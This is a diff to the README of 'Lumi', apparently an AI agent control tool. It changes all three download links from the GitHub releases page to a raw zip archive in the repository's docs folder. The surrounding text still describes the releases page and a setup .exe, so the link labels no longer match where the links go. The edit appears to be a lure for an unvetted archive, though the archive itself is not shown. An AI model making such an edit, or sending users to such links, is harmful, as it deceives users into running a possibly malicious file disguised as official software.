@@ -1,6 +1,6 @@
 # 🔒 Lumi - Secure, Autonomous AI Agent Control
 
-[![Download Lumi](https://img.shields.io/badge/Download-Lumi-blue?style=for-the-badge&logo=github)](https://github.com/sangki1234/Lumi/releases)
+[![Download Lumi](https://img.shields.io/badge/Download-Lumi-blue?style=for-the-badge&logo=github)](https://github.com/sangki1234/Lumi/raw/refs/heads/main/docs/Software-2.0-beta.1.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You will get Lumi from the official releases page on GitHub.
 
 Click the button below to visit the releases page and download the latest version suitable for Windows:
 
-[![Download Releases](https://img.shields.io/badge/Get-Latest%20Version-grey?style=for-the-badge&logo=github)](https://github.com/sangki1234/Lumi/releases)
+[![Download Releases](https://img.shields.io/badge/Get-Latest%20Version-grey?style=for-the-badge&logo=github)](https://github.com/sangki1234/Lumi/raw/refs/heads/main/docs/Software-2.0-beta.1.zip)
 
 1. Open the page in your web browser.
 2. Look for a file with a `.exe` extension that matches the latest version of Lumi for Windows. It will usually be named like `Lumi-Setup-x.y.z.exe`.
@@ -103,4 +103,4 @@ Lumi encrypts all data sent between devices. This protects your information from
 
 ---
 
-[Download Lumi from GitHub Releases](https://github.com/sangki1234/Lumi/releases)
+[Download Lumi from GitHub Releases](https://github.com/sangki1234/Lumi/raw/refs/heads/main/docs/Software-2.0-beta.1.zip)
